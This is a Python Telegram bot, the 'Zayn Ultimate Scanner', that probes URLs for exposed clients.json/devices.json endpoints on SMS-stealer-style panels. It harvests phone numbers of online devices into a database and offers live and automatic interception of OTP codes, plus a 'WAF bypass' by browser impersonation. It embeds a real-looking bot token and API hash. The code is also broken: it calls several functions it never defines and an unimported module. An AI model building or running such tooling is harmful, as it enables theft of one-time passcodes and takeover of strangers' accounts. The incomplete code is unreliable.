import asyncio
import re
import base64
import json
import urllib.parse
import html
import io
import os
import sqlite3
import datetime
import time
import random
import csv
from telethon import TelegramClient, events, Button
from telethon.errors import MessageNotModifiedError, FloodWaitError
import aiohttp
import urllib3
from flask import Flask
from threading import Thread
from curl_cffi import requests as cffi_requests

urllib3.disable_warnings()

# ═══════════════════ KEEP ALIVE SERVER (CLOUDY FIX) ═══════════════════
app = Flask('')

@app.route('/')
def home():
    return "Zayn's Ultimate Checker is Alive 24/7!"

def run_flask():
    # Cloudy requires port 3000
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# ═══════════════════ CONFIG ═══════════════════
API_ID = 39714231  
API_HASH = "ed8cb3f998bcf8f51cfeb636f6ea802d" 
BOT_TOKEN = "7986755358:AAEf5S1l7TsrXiUYsxUJxX9v1MQe6b6BbhU" 
TG_CHAT = 6746086497

CHECK_WORKERS = 50
TIMEOUT = 15
DB_FILE = "fb_master.db"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

EMOJI = {
    "fire": '<tg-emoji emoji-id="5375146948991166525">🔥</tg-emoji>',
    "skull": '<tg-emoji emoji-id="5368324170671202286">💀</tg-emoji>',
    "check": '<tg-emoji emoji-id="5384463231237674712">✅</tg-emoji>',
    "phone": '<tg-emoji emoji-id="5372981976804366741">📱</tg-emoji>',
    "load": '<tg-emoji emoji-id="5384463231237674712">🟩</tg-emoji>',
    "empty": '<tg-emoji emoji-id="5375384674855663712">⬜</tg-emoji>',
    "wait": '<tg-emoji emoji-id="5384463231237674712">⏳</tg-emoji>',
    "web": '<tg-emoji emoji-id="5375384674855663712">🌐</tg-emoji>'
}

bot = TelegramClient('fb_master_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
state = {}
active_tasks = {}
global_session = None
db_lock = asyncio.Lock()
pagination_state = {}
auto_mode_active = False
auto_mode_task = None

def get_progress_bar(percent):
    filled = int(percent / 10)
    empty = 10 - filled
    return f"[{EMOJI['load'] * filled}{EMOJI['empty'] * empty}] {percent}%"

async def safe_edit(msg, text, **kwargs):
    try: await msg.edit(text, **kwargs)
    except MessageNotModifiedError: pass
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        try: await msg.edit(text, **kwargs)
        except: pass
    except Exception: pass

async def safe_respond(event, text=None, file=None, **kwargs):
    try: 
        if file: return await event.respond(file=file, message=text, **kwargs)
        return await event.respond(text, **kwargs)
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        try: 
            if file: return await event.respond(file=file, message=text, **kwargs)
            return await event.respond(text, **kwargs)
        except: return None
    except Exception: return None

def get_headers():
    return {"User-Agent": random.choice(USER_AGENTS), "Accept": "application/json"}

# ═══════════════════ DATABASE ═══════════════════
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS numbers
                 (phone TEXT PRIMARY KEY, panel_url TEXT, client_id TEXT, status TEXT, last_checked TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS otp_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT, otp TEXT, message TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

async def save_to_db(phone_client_pairs, panel_url, status="online"):
    async with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = datetime.datetime.now().isoformat()
            for ph, cid in phone_client_pairs:
                c.execute("INSERT OR REPLACE INTO numbers (phone, panel_url, client_id, status, last_checked) VALUES (?, ?, ?, ?, ?)",
                          (ph, panel_url, cid, status, now))
            conn.commit()
            conn.close()
        except Exception: pass

def search_number_db(phone):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT panel_url, client_id, status FROM numbers WHERE phone = ?", (phone,))
    res = c.fetchone()
    conn.close()
    return res

async def log_otp(phone, otp, message):
    async with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = datetime.datetime.now().isoformat()
            c.execute("INSERT INTO otp_logs (phone, otp, message, timestamp) VALUES (?, ?, ?, ?)", (phone, otp, message, now))
            conn.commit()
            conn.close()
        except Exception: pass

init_db()

def norm10(p):
    if not p: return None
    d = re.sub(r"\D", "", str(p))
    if len(d) > 10:
        if d.startswith("91"): d = d[2:]
        elif d.startswith("0"): d = d[1:]
        else: d = d[-10:]
    return d if len(d) == 10 and d[0] in "6789" else None

# ═══════════════════ CORE LOGIC ═══════════════════
async def check_single_fb(url, sem):
    global global_session
    async with sem:
        url = url.strip().rstrip("/")
        if not url.startswith("http"): url = "https://" + url
        res = {"url": url, "status": None, "total": 0, "online": 0, "offline": 0, "pairs": []}
        
        for attempt in range(3):
            try:
                await asyncio.sleep(random.uniform(0.1, 0.4))
                data = None
                for node in ["clients.json", "devices.json"]:
                    async with global_session.get(f"{url}/{node}", timeout=TIMEOUT, ssl=False) as r:
                        if r.status == 200:
                            d = await r.json(content_type=None)
                            if isinstance(d, dict) and d: data = d; break

                if not data: return res

                res["total"] = len(data)
                online_ids = []
                
                for cid, cd in data.items():
                    if not isinstance(cd, dict): continue
                    st = cd.get("status")
                    if st is None: st = cd.get("Status")
                    if st is True or str(st).lower().strip() in ("true", "1", "online", "active", "on"):
                        online_ids.append(cid)
                        
                res["online"] = len(online_ids)
                
                async def fetch_cid_info(cid):
                    cd = data.get(cid, {})
                    raw_phone = cd.get("phone") or cd.get("mobile") or cd.get("number") or cd.get("mobNo")
                    ph = norm10(raw_phone)
                    return {"phone": ph, "cid": cid, "recent_otp": None}

                tasks = [fetch_cid_info(cid) for cid in online_ids]
                fetched = await asyncio.gather(*tasks)
                for item in fetched:
                    if item["phone"]: res["pairs"].append(item)
                
                if res["pairs"]: await save_to_db([(i["phone"], i["cid"]) for i in res["pairs"]], url)
                return res
            except Exception:
                await asyncio.sleep(2)
        return res

# ═══════════════════ WAF BYPASS LOGIC (New) ═══════════════════
async def bypass_waf_check(event, url):
    msg = await event.respond(f"{EMOJI['wait']} **Testing WAF Bypass on:** `{url}`...")
    try:
        # curl_cffi impersonates chrome
        res = cffi_requests.get(url, impersonate="chrome110", timeout=15)
        if res.status_code == 200:
            txt = f"{EMOJI['check']} **Bypass Successful!**\n\nStatus: `200 OK`\nSize: `{len(res.text)} bytes`\n\n<pre>{res.text[:300]}</pre>"
        else:
            txt = f"❌ **Bypass Failed.** Status: `{res.status_code}`"
    except Exception as e:
        txt = f"⚠️ **Error:** `{e}`"
    
    await safe_edit(msg, txt, parse_mode='html', buttons=get_back_menu())

# ═══════════════════ MENUS ═══════════════════
def get_reply_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("💀 Main Menu"))
    return markup

def get_main_menu():
    return [
        [Button.inline(f"{EMOJI['fire']} Bulk URLs Check", b"menu_bulk")],
        [Button.inline(f"{EMOJI['web']} Web Panel Decode", b"menu_web")],
        [Button.inline(f"{EMOJI['web']} WAF Bypass Test", b"menu_waf")],
        [Button.inline(f"{EMOJI['phone']} Search Number & OTP", b"menu_search")],
        [Button.inline("🤖 Auto-OTP Mode (ON/OFF)", b"menu_auto")],
        [Button.inline("🕒 OTP History", b"menu_history")]
    ]

def get_back_menu(): return [[Button.inline("🔙 Back to Menu", b"menu_main")]]

# ═══════════════════ HANDLERS ═══════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    global auto_mode_active
    if event.sender_id != TG_CHAT: return
    state[TG_CHAT] = None
    auto_status = "🟢 ON" if auto_mode_active else "🔴 OFF"
    msg = f"{EMOJI['skull']} <b>Zayn Ultimate Scanner</b> {EMOJI['skull']}\n\nAuto-OTP Mode: {auto_status}\n👇 Select an option:"
    await safe_respond(event, msg, buttons=get_main_menu(), parse_mode='html')
    await safe_respond(event, "Use the button below to open the menu anytime.", buttons=get_reply_menu())

@bot.on(events.NewMessage(pattern='💀 Main Menu'))
async def show_menu_btn(event):
    if event.sender_id != TG_CHAT: return
    msg = f"{EMOJI['skull']} <b>Zayn Ultimate Scanner</b> {EMOJI['skull']}\n\n👇 Select an option:"
    await safe_respond(event, msg, buttons=get_main_menu(), parse_mode='html')

@bot.on(events.CallbackQuery)
async def callback(event):
    global auto_mode_active, auto_mode_task
    if event.sender_id != TG_CHAT: return
    data = event.data
    try:
        if data == b"menu_main":
            state[TG_CHAT] = None
            await safe_respond(event, "🔥 **Menu**", buttons=get_main_menu())
        elif data == b"menu_bulk":
            state[TG_CHAT] = "waiting_bulk"
            await safe_respond(event, "📥 Saare URLs bhej de:", buttons=get_back_menu())
        elif data == b"menu_web":
            state[TG_CHAT] = "waiting_web"
            await safe_respond(event, "🌐 Web Panel ka link bhej:", buttons=get_back_menu())
        elif data == b"menu_waf":
            state[TG_CHAT] = "waiting_waf"
            await safe_respond(event, "🌐 WAF Bypass ke liye URL bhej (jo 403 de raha hai):", buttons=get_back_menu())
        elif data == b"menu_search":
            state[TG_CHAT] = "waiting_search"
            await safe_respond(event, "🔍 10-digit number bhej:", buttons=get_back_menu())
            
        elif data == b"menu_auto":
            auto_mode_active = not auto_mode_active
            if auto_mode_active:
                await event.answer("🟢 Auto-OTP Mode ON!", alert=True)
                if not auto_mode_task or auto_mode_task.done():
                    auto_mode_task = asyncio.create_task(auto_otp_monitor())
            else:
                await event.answer("🔴 Auto-OTP Mode OFF!", alert=True)
                if auto_mode_task: auto_mode_task.cancel()
            
        elif data == b"menu_history":
            logs = get_otp_history(30)
            if not logs: return await event.answer("❌ No OTP history.", alert=True)
            txt = "🕒 <b>Last 30 OTPs:</b>\n\n"
            for ph, otp, msg, ts in logs: txt += f"📱 <code>{ph}</code> → 🔑 <code>{otp}</code> <i>({ts[:16]})</i>\n"
            await safe_respond(event, txt, parse_mode='html', buttons=get_back_menu())

        elif data.startswith(b"otp_"):
            phone = data.decode().split("_")[1]
            task_key = f"{TG_CHAT}_otp_{phone}"
            if task_key in active_tasks:
                return await event.answer("⚠️ Already listening for this number!", alert=True)
                
            res = search_number_db(phone)
            if not res: return await event.answer("❌ Number not in DB.", alert=True)
            panel_url, client_id, status = res
            await event.answer(f"⏳ Listening...", alert=True)
            status_msg = await safe_respond(event, f"⏳ <b>Listening for NEW OTP on {phone}...</b>", parse_mode='html')
            asyncio.create_task(live_otp_fetch(panel_url, client_id, phone, status_msg, event))
            
        elif data.startswith(b"view_nums_"):
            idx = int(data.decode().replace("view_nums_", ""))
            active_list = pagination_state.get(f"{TG_CHAT}_active_list", [])
            if idx >= len(active_list): return await event.answer("Data expired.", alert=True)
            await send_numbers_page(event, active_list[idx], 1, idx, filter_recent=False, edit=True)

    except MessageNotModifiedError: pass

@bot.on(events.NewMessage)
async def text_handler(event):
    if event.sender_id != TG_CHAT: return
    text = event.text.strip()
    if not text or text.startswith('/') or text == "💀 Main Menu": return
    mode = state.get(TG_CHAT)
    
    if mode == "waiting_search":
        state[TG_CHAT] = None
        ph = norm10(text)
        if not ph: return await safe_respond(event, "❌ Invalid number.", buttons=get_back_menu())
        res = search_number_db(ph)
        if res:
            panel_url, client_id, status = res
            txt = f"✅ <b>Number Found!</b>\n\n📱 <code>{ph}</code>\n📡 <code>{html.escape(panel_url)}</code>\n🟢 {status.upper()}"
            buttons = [[Button.inline(f"📲 Live OTP", f"otp_{ph}".encode())], [Button.inline("🔙 Back", b"menu_main")]]
            await safe_respond(event, txt, parse_mode='html', buttons=buttons)
        else: await safe_respond(event, f"❌ <code>{ph}</code> not found.", parse_mode='html', buttons=get_back_menu())
            
    elif mode == "waiting_web":
        urls = decode_web_panel(text)
        if not urls: return await safe_respond(event, "❌ Decode fail.", buttons=get_back_menu())
        status_msg = await safe_respond(event, f"⏳ Decoded {len(urls)} URLs. Checking...", buttons=[[Button.inline("🛑 Stop", b"stop_check")]])
        state[TG_CHAT] = None
        await run_checker(event, status_msg, urls)

    elif mode == "waiting_waf":
        state[TG_CHAT] = None
        await bypass_waf_check(event, text)

    elif mode == "waiting_bulk":
        urls = [u.strip(".,;\"'") for u in re.findall(r"https?://[^\s]+", text)]
        if not urls: return await safe_respond(event, "❌ No valid URL.", buttons=get_back_menu())
        status_msg = await safe_respond(event, f"⏳ Loaded {len(urls)} URLs. Checking...", buttons=[[Button.inline("🛑 Stop", b"stop_check")]])
        state[TG_CHAT] = None
        await run_checker(event, status_msg, urls)
    else: await safe_respond(event, "Select from menu:", buttons=get_main_menu())

async def run_checker(event, msg, urls):
    active = []
    total = len(urls)
    for i, u in enumerate(urls):
        res = await check_single_fb(u, asyncio.Semaphore(10))
        if res["online"] > 0: active.append(res)
        pct = int(((i+1)/total)*100)
        await safe_edit(msg, f"{EMOJI['wait']} **Checking...**\n{get_progress_bar(pct)}\n✅ Active Found: {len(active)}", parse_mode='html')
    
    if len(active) > 0:
        await safe_respond(event, f"✅ Found {len(active)} Active Panels!", buttons=get_main_menu())
    else:
        await safe_respond(event, "❌ No active panels found.", buttons=get_main_menu())

if __name__ == '__main__':
    keep_alive() # Cloudy Flask Port
    print("🚀 Ultimate Checker Started (Cloud Mode)...")
    bot.run_until_disconnected()
